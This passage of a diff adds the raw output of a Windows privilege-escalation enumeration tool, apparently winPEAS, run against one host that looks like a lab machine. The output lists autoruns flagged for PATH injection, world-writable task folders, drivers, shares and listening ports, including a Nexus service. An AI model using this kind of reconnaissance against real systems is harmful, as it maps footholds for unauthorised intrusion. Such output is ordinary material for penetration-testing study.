+    C:\Windows\System32\WindowsPowerShell\v1.0\
+    C:\Windows\System32\OpenSSH\
+    C:\Program Files\dotnet\
+    C:\Program Files (x86)\dotnet\
+
+
+  ====================================(Applications Information)====================================
+
+  [+] Current Active Window Application
+  [X] Exception: Object reference not set to an instance of an object.
+
+  [+] Installed Applications --Via Program Files/Uninstall registry--
+   [?] Check if you can modify installed software https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#software
+    C:\Program Files\Common Files
+    C:\Program Files\desktop.ini
+    C:\Program Files\dotnet
+    C:\Program Files\IIS
+    C:\Program Files\Internet Explorer
+    C:\Program Files\ModifiableWindowsApps
+    C:\Program Files\Uninstall Information
+    C:\Program Files\UNP
+    C:\Program Files\VMware
+    C:\Program Files\Windows Defender
+    C:\Program Files\Windows Defender Advanced Threat Protection
+    C:\Program Files\Windows Mail
+    C:\Program Files\Windows Media Player
+    C:\Program Files\Windows Multimedia Platform
+    C:\Program Files\Windows NT
+    C:\Program Files\Windows Photo Viewer
+    C:\Program Files\Windows Portable Devices
+    C:\Program Files\Windows Security
+    C:\Program Files\Windows Sidebar
+    C:\Program Files\WindowsApps
+    C:\Program Files\WindowsPowerShell
+
+
+  [+] Autorun Applications
+   [?] Check if you can modify other users AutoRuns binaries (Note that is normal that you can modify HKCU registry and binaries indicated there) https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries
+
+    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+    Key: SecurityHealth
+    Folder: C:\Windows\system32
+    File: C:\Windows\system32\SecurityHealthSystray.exe
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+    Key: VMware User Process
+    Folder: C:\Program Files\VMware\VMware Tools
+    File: C:\Program Files\VMware\VMware Tools\vmtoolsd.exe -n vmusr (Unquoted and Space detected)
+   =================================================================================================
+
+
+    RegPath: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+    RegPerms: nathan [FullControl]
+    Key: OneDrive
+    Folder: C:\Users\nathan\AppData\Local\Microsoft\OneDrive
+    FolderPerms: nathan [AllAccess]
+    File: C:\Users\nathan\AppData\Local\Microsoft\OneDrive\OneDrive.exe /background
+    FilePerms: nathan [AllAccess]
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
+    Key: Common Startup
+    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup (Unquoted and Space detected)
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
+    Key: Common Startup
+    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup (Unquoted and Space detected)
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
+    Key: Userinit
+    Folder: C:\Windows\system32
+    File: C:\Windows\system32\userinit.exe,
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
+    Key: Shell
+    Folder: None (PATH Injection)
+    File: explorer.exe
+   =================================================================================================
+
+
+    RegPath: HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot
+    Key: AlternateShell
+    Folder: None (PATH Injection)
+    File: cmd.exe
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Font Drivers
+    Key: Adobe Type Manager
+    Folder: None (PATH Injection)
+    File: atmfd.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers
+    Key: Adobe Type Manager
+    Folder: None (PATH Injection)
+    File: atmfd.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: aux
+    Folder: None (PATH Injection)
+    File: wdmaud.drv
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: midi
+    Folder: None (PATH Injection)
+    File: wdmaud.drv
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: midimapper
+    Folder: None (PATH Injection)
+    File: midimap.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: mixer
+    Folder: None (PATH Injection)
+    File: wdmaud.drv
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: msacm.imaadpcm
+    Folder: None (PATH Injection)
+    File: imaadp32.acm
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: msacm.msadpcm
+    Folder: None (PATH Injection)
+    File: msadp32.acm
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: msacm.msg711
+    Folder: None (PATH Injection)
+    File: msg711.acm
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: msacm.msgsm610
+    Folder: None (PATH Injection)
+    File: msgsm32.acm
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: vidc.i420
+    Folder: None (PATH Injection)
+    File: iyuv_32.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: vidc.iyuv
+    Folder: None (PATH Injection)
+    File: iyuv_32.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: vidc.mrle
+    Folder: None (PATH Injection)
+    File: msrle32.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: vidc.msvc
+    Folder: None (PATH Injection)
+    File: msvidc32.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: vidc.uyvy
+    Folder: None (PATH Injection)
+    File: msyuv.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: vidc.yuy2
+    Folder: None (PATH Injection)
+    File: msyuv.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: vidc.yvu9
+    Folder: None (PATH Injection)
+    File: tsbyuv.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: vidc.yvyu
+    Folder: None (PATH Injection)
+    File: msyuv.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: wave
+    Folder: None (PATH Injection)
+    File: wdmaud.drv
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: wavemapper
+    Folder: None (PATH Injection)
+    File: msacm32.drv
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: msacm.l3acm
+    Folder: C:\Windows\System32
+    File: C:\Windows\System32\l3codeca.acm
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: aux
+    Folder: None (PATH Injection)
+    File: wdmaud.drv
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: midi
+    Folder: None (PATH Injection)
+    File: wdmaud.drv
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: midimapper
+    Folder: None (PATH Injection)
+    File: midimap.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: mixer
+    Folder: None (PATH Injection)
+    File: wdmaud.drv
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: msacm.imaadpcm
+    Folder: None (PATH Injection)
+    File: imaadp32.acm
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: msacm.msadpcm
+    Folder: None (PATH Injection)
+    File: msadp32.acm
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: msacm.msg711
+    Folder: None (PATH Injection)
+    File: msg711.acm
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: msacm.msgsm610
+    Folder: None (PATH Injection)
+    File: msgsm32.acm
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: vidc.cvid
+    Folder: None (PATH Injection)
+    File: iccvid.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: vidc.i420
+    Folder: None (PATH Injection)
+    File: iyuv_32.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: vidc.iyuv
+    Folder: None (PATH Injection)
+    File: iyuv_32.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: vidc.mrle
+    Folder: None (PATH Injection)
+    File: msrle32.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: vidc.msvc
+    Folder: None (PATH Injection)
+    File: msvidc32.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: vidc.uyvy
+    Folder: None (PATH Injection)
+    File: msyuv.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: vidc.yuy2
+    Folder: None (PATH Injection)
+    File: msyuv.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: vidc.yvu9
+    Folder: None (PATH Injection)
+    File: tsbyuv.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: vidc.yvyu
+    Folder: None (PATH Injection)
+    File: msyuv.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: wave
+    Folder: None (PATH Injection)
+    File: wdmaud.drv
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: wavemapper
+    Folder: None (PATH Injection)
+    File: msacm32.drv
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
+    Key: msacm.l3acm
+    Folder: C:\Windows\SysWOW64
+    File: C:\Windows\SysWOW64\l3codeca.acm
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Classes\htmlfile\shell\open\command
+    Folder: C:\Program Files\Internet Explorer
+    File: C:\Program Files\Internet Explorer\iexplore.exe %1 (Unquoted and Space detected)
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: _wow64cpu
+    Folder: None (PATH Injection)
+    File: wow64cpu.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: _wowarmhw
+    Folder: None (PATH Injection)
+    File: wowarmhw.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: _xtajit
+    Folder: None (PATH Injection)
+    File: xtajit.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: advapi32
+    Folder: None (PATH Injection)
+    File: advapi32.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: clbcatq
+    Folder: None (PATH Injection)
+    File: clbcatq.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: combase
+    Folder: None (PATH Injection)
+    File: combase.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: COMDLG32
+    Folder: None (PATH Injection)
+    File: COMDLG32.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: coml2
+    Folder: None (PATH Injection)
+    File: coml2.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: DifxApi
+    Folder: None (PATH Injection)
+    File: difxapi.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: gdi32
+    Folder: None (PATH Injection)
+    File: gdi32.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: gdiplus
+    Folder: None (PATH Injection)
+    File: gdiplus.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: IMAGEHLP
+    Folder: None (PATH Injection)
+    File: IMAGEHLP.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: IMM32
+    Folder: None (PATH Injection)
+    File: IMM32.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: kernel32
+    Folder: None (PATH Injection)
+    File: kernel32.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: MSCTF
+    Folder: None (PATH Injection)
+    File: MSCTF.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: MSVCRT
+    Folder: None (PATH Injection)
+    File: MSVCRT.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: NORMALIZ
+    Folder: None (PATH Injection)
+    File: NORMALIZ.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: NSI
+    Folder: None (PATH Injection)
+    File: NSI.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: ole32
+    Folder: None (PATH Injection)
+    File: ole32.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: OLEAUT32
+    Folder: None (PATH Injection)
+    File: OLEAUT32.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: PSAPI
+    Folder: None (PATH Injection)
+    File: PSAPI.DLL
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: rpcrt4
+    Folder: None (PATH Injection)
+    File: rpcrt4.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: sechost
+    Folder: None (PATH Injection)
+    File: sechost.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: Setupapi
+    Folder: None (PATH Injection)
+    File: Setupapi.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: SHCORE
+    Folder: None (PATH Injection)
+    File: SHCORE.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: SHELL32
+    Folder: None (PATH Injection)
+    File: SHELL32.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: SHLWAPI
+    Folder: None (PATH Injection)
+    File: SHLWAPI.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: user32
+    Folder: None (PATH Injection)
+    File: user32.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: WLDAP32
+    Folder: None (PATH Injection)
+    File: WLDAP32.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: wow64
+    Folder: None (PATH Injection)
+    File: wow64.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: wow64win
+    Folder: None (PATH Injection)
+    File: wow64win.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
+    Key: WS2_32
+    Folder: None (PATH Injection)
+    File: WS2_32.dll
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{2C7339CF-2B09-4501-B3F3-F3508C9228ED}
+    Key: StubPath
+    Folder: \
+    FolderPerms: Authenticated Users [AppendData/CreateDirectories]
+    File: /UserInstall
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{6BF52A52-394A-11d3-B153-00C04F79FAA6}
+    Key: StubPath
+    Folder: C:\Windows\system32
+    File: C:\Windows\system32\unregmp2.exe /FirstLogon
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89820200-ECBD-11cf-8B85-00AA005B4340}
+    Key: StubPath
+    Folder: None (PATH Injection)
+    File: U
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89820200-ECBD-11cf-8B85-00AA005B4383}
+    Key: StubPath
+    Folder: C:\Windows\System32
+    File: C:\Windows\System32\ie4uinit.exe -UserConfig
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89B4C1CD-B018-4511-B0A1-5476DBF70820}
+    Key: StubPath
+    Folder: C:\Windows\System32
+    File: C:\Windows\System32\Rundll32.exe C:\Windows\System32\mscories.dll,Install
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Wow6432Node\Microsoft\Active Setup\Installed Components\{6BF52A52-394A-11d3-B153-00C04F79FAA6}
+    Key: StubPath
+    Folder: C:\Windows\system32
+    File: C:\Windows\system32\unregmp2.exe /FirstLogon
+   =================================================================================================
+
+
+    RegPath: HKLM\Software\Wow6432Node\Microsoft\Active Setup\Installed Components\{89B4C1CD-B018-4511-B0A1-5476DBF70820}
+    Key: StubPath
+    Folder: C:\Windows\SysWOW64
+    File: C:\Windows\SysWOW64\Rundll32.exe C:\Windows\SysWOW64\mscories.dll,Install
+   =================================================================================================
+
+
+    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
+    File: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini (Unquoted and Space detected)
+   =================================================================================================
+
+
+    Folder: C:\Users\nathan\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+    FolderPerms: nathan [AllAccess]
+    File: C:\Users\nathan\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini (Unquoted and Space detected)
+    FilePerms: nathan [AllAccess]
+   =================================================================================================
+
+
+    Folder: C:\windows\tasks
+    FolderPerms: Authenticated Users [WriteData/CreateFiles]
+   =================================================================================================
+
+
+    Folder: C:\windows\system32\tasks
+    FolderPerms: Authenticated Users [WriteData/CreateFiles]
+   =================================================================================================
+
+
+    Folder: C:\windows
+    File: C:\windows\system.ini
+   =================================================================================================
+
+
+    Folder: C:\windows
+    File: C:\windows\win.ini
+   =================================================================================================
+
+
+    Key: From WMIC
+    Folder: C:\Users\nathan\AppData\Local\Microsoft\OneDrive
+    FolderPerms: nathan [AllAccess]
+    File: C:\Users\nathan\AppData\Local\Microsoft\OneDrive\OneDrive.exe /background
+    FilePerms: nathan [AllAccess]
+   =================================================================================================
+
+
+    Key: From WMIC
+    Folder: C:\Windows\system32
+    File: C:\Windows\system32\SecurityHealthSystray.exe
+   =================================================================================================
+
+
+    Key: From WMIC
+    Folder: C:\Program Files\VMware\VMware Tools
+    File: C:\Program Files\VMware\VMware Tools\vmtoolsd.exe -n vmusr
+   =================================================================================================
+
+
+  [+] Scheduled Applications --Non Microsoft--
+   [?] Check if you can modify other users scheduled binaries https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries
+
+  [+] Device Drivers --Non Microsoft--
+   [?] Check 3rd party drivers for known vulnerabilities/rootkits. https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#vulnerable-drivers
+    QLogic 10 GigE - 7.13.65.105 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\evbda.sys
+    QLogic Gigabit Ethernet - 7.12.31.105 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bxvbda.sys
+    VMware vSockets Service - 9.8.12.0 build-8538197 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vsock.sys
+    NVIDIA nForce(TM) RAID Driver - 10.6.0.23 [NVIDIA Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\nvraid.sys
+    VMware PCI VMCI Bus Device - 9.8.6.0 build-3966680 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vmci.sys
+    Intel Matrix Storage Manager driver - 8.6.2.1019 [Intel Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\iaStorV.sys
+    VIA RAID driver - 7.0.9600,6352 [VIA Technologies Inc.,Ltd]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vsmraid.sys
+    LSI 3ware RAID Controller - WindowsBlue [LSI]: \\.\GLOBALROOT\SystemRoot\System32\drivers\3ware.sys
+    AHCI 1.3 Device Driver - 1.1.3.277 [Advanced Micro Devices]: \\.\GLOBALROOT\SystemRoot\System32\drivers\amdsata.sys
+    Storage Filter Driver - 1.1.3.277 [Advanced Micro Devices]: \\.\GLOBALROOT\SystemRoot\System32\drivers\amdxata.sys
+    AMD Technology AHCI Compatible Controller - 3.7.1540.43 [AMD Technologies Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\amdsbs.sys
+    Adaptec RAID Controller - 7.5.0.32048 [PMC-Sierra, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\arcsas.sys
+    Windows (R) Win 7 DDK driver - 10.0.10011.16384 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ItSas35i.sys
+    LSI Fusion-MPT SAS Driver (StorPort) - 1.34.03.83 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas.sys
+    Windows (R) Win 7 DDK driver - 10.0.10011.16384 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas2i.sys
+    Windows (R) Win 7 DDK driver - 10.0.10011.16384 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas3i.sys
+    LSI SSS PCIe/Flash Driver (StorPort) - 2.10.61.81 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sss.sys
+    MEGASAS RAID Controller Driver for Windows - 6.706.06.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\megasas.sys
+    MEGASAS RAID Controller Driver for Windows - 6.714.05.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\MegaSas2i.sys
+    MEGASAS RAID Controller Driver for Windows - 7.708.13.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\megasas35i.sys
+    MegaRAID Software RAID - 15.02.2013.0129 [LSI Corporation, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\megasr.sys
+    Marvell Flash Controller -  1.0.5.1016  [Marvell Semiconductor, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\mvumis.sys
+    NVIDIA nForce(TM) SATA Driver - 10.6.0.23 [NVIDIA Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\nvstor.sys
+    MEGASAS RAID Controller Driver for Windows - 6.805.03.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\percsas2i.sys
+    MEGASAS RAID Controller Driver for Windows - 6.604.06.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\percsas3i.sys
+    Microsoftr Windowsr Operating System - 2.60.01 [Silicon Integrated Systems Corp.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\SiSRaid2.sys
+    Microsoftr Windowsr Operating System - 6.1.6918.0 [Silicon Integrated Systems]: \\.\GLOBALROOT\SystemRoot\System32\drivers\sisraid4.sys
+    VIA StorX RAID Controller Driver - 8.0.9200.8110 [VIA Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vstxraid.sys
+     Promiser SuperTrak EX Series -  5.1.0000.10 [Promise Technology, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\stexstor.sys
+    Chelsio Communications iSCSI Controller - 10.0.10011.16384 [Chelsio Communications]: \\.\GLOBALROOT\SystemRoot\System32\drivers\cht4sx64.sys
+    Intel(R) Rapid Storage Technology driver (inbox) - 15.44.0.1010 [Intel Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\iaStorAVC.sys
+    PMC-Sierra HBA Controller - 1.3.0.10769 [PMC-Sierra]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ADP80XX.SYS
+    Smart Array SAS/SATA Controller Media Driver - 8.0.4.0 Build 1 Media Driver (x86-64) [Hewlett-Packard Company]: \\.\GLOBALROOT\SystemRoot\System32\drivers\HpSAMD.sys
+    SmartRAID, SmartHBA PQI Storport Driver - 1.50.0.0 [Microsemi Corportation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\SmartSAMD.sys
+    VMware Pointing PS/2 Device Driver - 12.5.7.0 build-3574480 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vmmouse.sys
+    VMware SVGA 3D - 8.16.01.0024 - build-12210530 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vm3dmp_loader.sys
+    VMware SVGA 3D - 8.16.01.0024 - build-12210530 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vm3dmp.sys
+    VMware server memory controller - 7.4.2.0 build-5980934 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vmmemctl.sys
+    VMware PCIe Ethernet Adapter NDIS 6.30 (64-bit) - 1.8.10.0 build-11711477 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vmxnet3.sys
+
+
+  =========================================(Network Information)=========================================
+
+  [+] Network Shares
+    ADMIN$ (Path: C:\Windows)
+    C$ (Path: C:\)
+    IPC$ (Path: )
+
+  [+] Enumerate Network Mapped Drives (WMI)
+
+  [+] Host File
+
+  [+] Network Ifaces and known hosts
+   [?] The masks are only for the IPv4 addresses
+    Ethernet0[00:50:56:BF:88:9C]: 192.168.98.61 / 255.255.255.0
+        Gateways: 192.168.98.254
+        DNSs: 192.168.98.254
+        Known hosts:
+          192.168.98.254        00-50-56-BF-A4-D8     Dynamic
+          224.0.0.22            01-00-5E-00-00-16     Static
+          224.0.0.251           01-00-5E-00-00-FB     Static
+
+    Loopback Pseudo-Interface 1[]: 127.0.0.1, ::1 / 255.0.0.0
+        DNSs: fec0:0:0:ffff::1%1, fec0:0:0:ffff::2%1, fec0:0:0:ffff::3%1
+        Known hosts:
+          224.0.0.22            00-00-00-00-00-00     Static
+          224.0.0.251           00-00-00-00-00-00     Static
+
+
+  [+] Current TCP Listening Ports
+   [?] Check for services restricted from the outside
+  Enumerating IPv4 connections
+
+  Protocol   Local Address         Local Port    Remote Address        Remote Port     State             Process ID      Process Name
+
+  TCP        0.0.0.0               21            0.0.0.0               0               Listening         1848            svchost
+  TCP        0.0.0.0               80            0.0.0.0               0               Listening         4               System
+  TCP        0.0.0.0               135           0.0.0.0               0               Listening         812             svchost
+  TCP        0.0.0.0               445           0.0.0.0               0               Listening         4               System
+  TCP        0.0.0.0               5040          0.0.0.0               0               Listening         996             svchost
+  TCP        0.0.0.0               8081          0.0.0.0               0               Listening         2100            C:\Users\nathan\Nexus\nexus-3.21.0-05\bin\nexus.exe
+  TCP        0.0.0.0               49664         0.0.0.0               0               Listening         592             lsass
+  TCP        0.0.0.0               49665         0.0.0.0               0               Listening         492             wininit
+  TCP        0.0.0.0               49666         0.0.0.0               0               Listening         272             svchost
+  TCP        0.0.0.0               49667         0.0.0.0               0               Listening         784             svchost
+  TCP        0.0.0.0               49668         0.0.0.0               0               Listening         1540            spoolsv
+  TCP        0.0.0.0               49669         0.0.0.0               0               Listening         584             services
